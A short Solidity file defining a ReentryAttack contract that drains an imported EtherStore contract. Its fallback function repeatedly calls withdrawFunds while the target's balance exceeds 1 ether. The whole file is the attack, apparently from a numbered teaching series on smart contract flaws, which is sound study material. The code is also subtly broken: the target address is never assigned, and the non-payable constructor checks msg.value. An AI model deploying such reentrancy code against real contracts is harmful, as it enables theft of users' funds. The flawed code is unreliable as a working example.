pragma solidity >=0.4.33 <0.6.0;

import "./18.ether_store.sol";

contract ReentryAttack {
    EtherStore  public etherStore;

    function() payable external {
        if (etherStore.balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
    constructor (address etherStoreAddress) public{
        require(msg.value >= 1 ether);
        etherStore.depositFunds.value(1 ether)();
        etherStore.withdrawFunds(1 ether);
    }
    function putEtherStore() public payable {
        require(msg.value >= 1 ether);
        etherStore.depositFunds.value(1 ether)();
        etherStore.withdrawFunds(1 ether);
    }
}